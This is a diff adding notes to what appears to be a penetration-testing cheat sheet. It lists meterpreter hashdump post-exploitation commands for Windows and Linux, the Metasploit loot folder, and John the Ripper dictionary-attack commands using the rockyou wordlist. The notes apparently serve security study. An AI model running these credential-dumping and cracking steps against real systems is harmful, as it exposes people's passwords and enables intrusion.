@@ -74,8 +74,38 @@ bob
 
 -- Minimum number of characters 4 and maximum number of characters 6 and small alphanumeric 
 
-John the Ripper
+John the Ripper : Offline password attack
 ===============
+To dump the hashes from windows system using meterpreter 
+meterpreter> run post/windows/gather/hashdump
+
+Copy all the hashes into text file.
+
+Linux system
+
+meterpreter> run post/linux/gather/hashdump
+
+cd /root/.msf4/loot/
+
+ls 
+
+copy the hashed file to desired location.
+
+# john
+
+# john --format=md5 <hash_file>.txt 
+
+Dictionary attack
+# john --format=lm --wordlist=/usr/share/wordlists/rockyou.txt <hash_file>.txt
+
+Johnny/ xHydra
+==============
+- GUI for john and hydra
+
+#johnny
+
+
+
 
 
 
